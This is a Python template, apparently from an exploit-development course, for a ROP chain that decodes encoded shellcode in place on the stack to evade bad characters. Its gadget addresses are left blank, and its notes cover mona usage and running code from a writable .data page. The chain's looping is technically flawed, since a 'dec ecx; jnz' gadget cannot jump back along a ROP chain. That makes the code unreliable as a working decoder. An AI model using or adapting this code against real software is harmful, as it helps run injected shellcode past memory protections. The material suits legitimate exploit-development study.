#!/usr/bin/env python3
"""EXP-301 ROP payload decoder skeleton (the 'ROP Payload Decoders' module).

When badchars block raw shellcode: encode shellcode (e.g. sub/xor per-byte),
place the encoded blob after the chain, and decode IN PLACE on the stack with a
ROP loop. This template assembles the classic sub-decoder pattern:

  for each 4-byte block at [edi]:
      eax = [edi]; sub eax, encoded_delta ; [edi] = eax ; edi += 4

Fill gadgets from mona (!mona rop -m <mod> -cpb '<badchars>'), encode your
shellcode with exp301.py encode, and let the loop rebuild it at runtime.
"""
import struct

def p32(v): return struct.pack('<I', v)

# --- gadgets to fill ---
POP_EAX   = 0x0   # pop eax ; ret
POP_EDI   = 0x0   # pop edi ; ret
POP_ECX   = 0x0   # pop ecx ; ret
MOV_EAX_DREF = 0x0  # mov eax, [edi] ; ret
SUB_EAX   = 0x0   # sub eax, imm32 ; ret        (or add eax, imm32 for negative)
MOV_DREF_EAX = 0x0  # mov [edi], eax ; ret
INC_EDI4  = 0x0   # add edi, 4 ; ret            (or 4x inc edi)
LOOP_DEC  = 0x0   # dec ecx ; jnz back          (or manual: dec ecx; jz done; jmp loop)

ENCODED_BLOB_ADDR = 0x0   # runtime stack addr of your encoded shellcode
N_BLOCKS = 0              # ceil(shellcode_len / 4)
DELTA = 0x01010101        # the per-block value your encoder added

def build():
    c  = p32(POP_EDI) + p32(ENCODED_BLOB_ADDR)
    c += p32(POP_ECX) + p32(N_BLOCKS)
    # loop:
    c += p32(MOV_EAX_DREF)          # eax = [edi]
    c += p32(SUB_EAX) + p32(DELTA)  # eax -= delta  (undoes encoder)
    c += p32(MOV_DREF_EAX)          # [edi] = eax
    c += p32(INC_EDI4)              # edi += 4
    c += p32(LOOP_DEC)              # ecx--, loop
    return c

# NOTES
# - If a gadget with imm32 (sub eax, imm32) contains a badchar in the imm,
#   split DELTA into two subs (DELTA = d1 + d2) with two sub gadgets.
# - Alignment: decode onto 4-byte boundaries; misaligned blobs corrupt the loop.
# - Alternative when stack space is tight: decoder writes to a writable
#   .data page, then jmp there (allows non-stack execution if DEP leaves
#   .data executable — check !mona modules for NX flags first).
